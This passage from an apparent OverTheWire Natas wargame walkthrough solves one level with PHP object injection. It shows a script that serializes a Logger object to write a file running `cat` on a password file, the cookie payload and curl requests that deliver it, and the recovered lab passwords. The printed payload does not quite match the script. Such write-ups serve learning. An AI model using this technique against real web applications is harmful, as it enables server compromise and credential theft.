logger_obj = phpserialize.phpobject(b'Logger', {
    b"logFile": "/var/www/natas/natas26/img/natas26_vandelay.php",
    b"initMsg": "",
    b"exitMsg": "<?php system(\"cat /etc/natas_webpass/natas27\"); ?>"
})

drawing_array = {0: logger_obj}

payload = base64.b64encode(phpserialize.dumps(drawing_array)).decode()
print(payload)
```

Run the python script:
```
abs@MacBookPro natas % python3 natas26.py
YToxOntpOjA7Tzo2OiJMb2dnZXIiOjM6e3M6NzoibG9nRmlsZSI7czo0NzoiL3Zhci93d3cvbmF0YXMvbmF0YXMyNi9pbWcvbmF0YXMyNl92YW5kZWxheS5waHAiO3M6NzoiaW5pdE1zZyI7czowOiIiO3M6NzoiZXhpdE1zZyI7czo1MDoiPD9waHAgc3lzdGVtKCJjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjYiKTsgPz4iO319
```


```
abs@MacBookPro OverTheWire % curl "http://natas26.natas.labs.overthewire.org/index.php?x1=10&y1=20&x2=30&y2=40" -u natas26:cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE -s -b "PHPSESSID=vandelay; drawing=YToxOntpOjA7Tzo2OiJMb2dnZXIiOjM6e3M6NzoibG9nRmlsZSI7czo0NzoiL3Zhci93d3cvbmF0YXMvbmF0YXMyNi9pbWcvbmF0YXMyNl92YW5kZWxheS5waHAiO3M6NzoiaW5pdE1zZyI7czowOiIiO3M6NzoiZXhpdE1zZyI7czo1MDoiPD9waHAgc3lzdGVtKCJjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjciKTsgPz4iO319"
...
<h1>natas26</h1>
...
<img src="img/natas26_vandelay.png">
```

Now the "img/natas26_vandelay.php" file is created, with the password hopefuly:
```
abs@MacBookPro OverTheWire % curl "http://natas26.natas.labs.overthewire.org/img/natas26_vandelay.php" -u natas26:cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE -s
u3RRffXjysjgwFU6b9xa23i6prmUsYne
```

# Level 26 -> 27:
# Level 27 -> 28:
# Level 28 -> 29:
# Level 29 -> 30:
# Level 30 -> 31:
# Level 31 -> 32:
# Level 32 -> 33:
# Level 33 -> 34: